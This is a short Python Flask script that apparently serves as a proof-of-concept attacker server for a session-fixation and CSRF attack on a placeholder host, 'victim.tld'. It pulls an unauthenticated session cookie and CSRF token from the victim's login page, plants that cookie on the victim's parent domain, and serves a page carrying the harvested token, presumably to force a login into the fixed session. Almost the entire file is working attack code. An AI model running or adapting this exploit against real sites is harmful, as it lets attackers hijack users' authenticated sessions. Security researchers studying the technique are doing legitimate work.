from flask import Flask, make_response, render_template
import requests

app = Flask(__name__)
app.config.update(
    DEBUG=True,
    )

values = {}

@app.route("/csrf")
def trigger_csrf():
    print("CSRF token: {}".format(values["csrf_token"]))
    return render_template("index.html", token=values["csrf_token"])

@app.route("/cookie")
def cookie_fixation():
    # First retrieve the cookie and the CSRF token for a session
    # that is not authenticated
    res = requests.get("https://victim.tld:5000/login", verify=False)
    cookie = res.cookies.get("session")
    print("Cookie: {}".format(cookie))
    # Now retrieve CSRF token
    csrf_token = res.text.split('name="csrf_token" value="')[1].split('">')[0]
    values["csrf_token"] = csrf_token
    print("CSRF token: {}".format(csrf_token))
    response = make_response()
    # Set the cookie with victim.tld domain
    response.set_cookie("session", cookie, domain=".victim.tld", httponly=True, path="/login")
    return response



if __name__ == "__main__":
    app.run(debug=True, ssl_context="adhoc", port=8000)
